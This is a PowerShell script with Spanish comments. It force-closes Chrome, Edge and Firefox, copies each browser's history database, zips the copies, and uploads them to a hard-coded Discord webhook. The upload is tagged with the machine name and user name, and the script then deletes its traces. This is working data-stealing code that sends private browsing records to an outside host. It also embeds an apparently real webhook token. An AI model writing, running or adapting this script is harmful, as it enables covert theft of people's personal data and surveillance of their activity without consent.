$discordWebhookUrl = "https://discord.com/api/webhooks/1348379829598163038/BBTDV8jHgoMyF4sNPi2L_IyAZSsbmrtyuhE7VCAMiT0PVuTPTF-_OqDkWjPfDvC5YBkP"
#tal vez no sea buena idea dejar esto aqui
<#
.SYNOPSIS
Envía historiales de navegación como archivo ZIP adjunto a Discord

.NOTES
- Requiere PowerShell 5.1+
- Compatible con Chrome, Edge y Firefox
#>

function Initialize-BackupEnvironment {
    param(
        [string]$BasePath = "$env:TEMP\BrowserHistory"
    )

    $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
    $targetFolder = Join-Path $BasePath $timestamp
    
    if (-not (Test-Path $targetFolder)) {
        New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null
    }
    
    return $targetFolder
}

function Close-Browsers {
    param(
        [string[]]$BrowserProcesses = @('chrome', 'msedge', 'firefox', 'msedgewebview2')
    )
    
    foreach ($process in $BrowserProcesses) {
        try {
            if (Get-Process $process -ErrorAction SilentlyContinue) {
                Stop-Process -Name $process -Force -ErrorAction Stop
                Start-Sleep -Milliseconds 500
            }
        }
        catch {}
    }
}

function Backup-BrowserData {
    param(
        [string]$TargetFolder,
        [string]$BrowserName,
        [string]$SourcePath,
        [string]$FileName
    )

    try {
        if (Test-Path $SourcePath) {
            $destPath = Join-Path $TargetFolder $FileName
            Copy-Item -Path $SourcePath -Destination $destPath -Force
            return $destPath
        }
    }
    catch {
        return $null
    }
}

function Send-ZipToDiscord {
    param(
        [string]$WebhookUrl,
        [string]$ZipPath,
        [string]$Message
    )

    try {
        $embed = @{
            title = "Historial de navegación"
            description = $Message
            color = 16744272
            timestamp = (Get-Date -Format "o")
        }

        $payload = @{
            embeds = @($embed)
        } | ConvertTo-Json -Depth 4

        $form = @{
            'payload_json' = $payload
            'file' = Get-Item -Path $ZipPath
        }

        Invoke-RestMethod -Uri $WebhookUrl -Method Post `
            -Form $form `
            -ContentType 'multipart/form-data'
    }
    catch {
        Write-Host "Error enviando ZIP: $_" -ForegroundColor Red
    }
}

#------------------- EJECUCIÓN PRINCIPAL -------------------
try {
    # Configuración inicial
    $targetFolder = Initialize-BackupEnvironment
    Close-Browsers

    # Recolectar historiales
    $files = @()
    
    # Chrome
    $chromeFile = Backup-BrowserData -TargetFolder $targetFolder `
        -BrowserName "Chrome" `
        -SourcePath "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" `
        -FileName "chrome_history.db"
    if ($chromeFile) { $files += $chromeFile }

    # Edge
    $edgeFile = Backup-BrowserData -TargetFolder $targetFolder `
        -BrowserName "Edge" `
        -SourcePath "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" `
        -FileName "edge_history.db"
    if ($edgeFile) { $files += $edgeFile }

    # Firefox
    $firefoxPath = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" | 
                   Select-Object -First 1 -ExpandProperty FullName
    $firefoxFile = Backup-BrowserData -TargetFolder $targetFolder `
        -BrowserName "Firefox" `
        -SourcePath $firefoxPath `
        -FileName "firefox_places.sqlite"
    if ($firefoxFile) { $files += $firefoxFile }

    # Crear ZIP
    $zipPath = "$env:TEMP\historial_$(Get-Date -Format 'yyyyMMddHHmmss').zip"
    Compress-Archive -Path $files -DestinationPath $zipPath -CompressionLevel Optimal -Force

    # Enviar a Discord
    if (Test-Path $zipPath) {
        $computerName = $env:COMPUTERNAME
        $userName = $env:USERNAME
        Send-ZipToDiscord -WebhookUrl $discordWebhookUrl -ZipPath $zipPath `
            -Message "Recolectado de $computerName ($userName)"
    }
}
catch {
    Write-Host "Error general: $_" -ForegroundColor Red
}
finally {
    # Limpieza
    if ($targetFolder) { Remove-Item $targetFolder -Recurse -Force -ErrorAction SilentlyContinue }
    if ($zipPath -and (Test-Path $zipPath)) { Remove-Item $zipPath -Force -ErrorAction SilentlyContinue }
}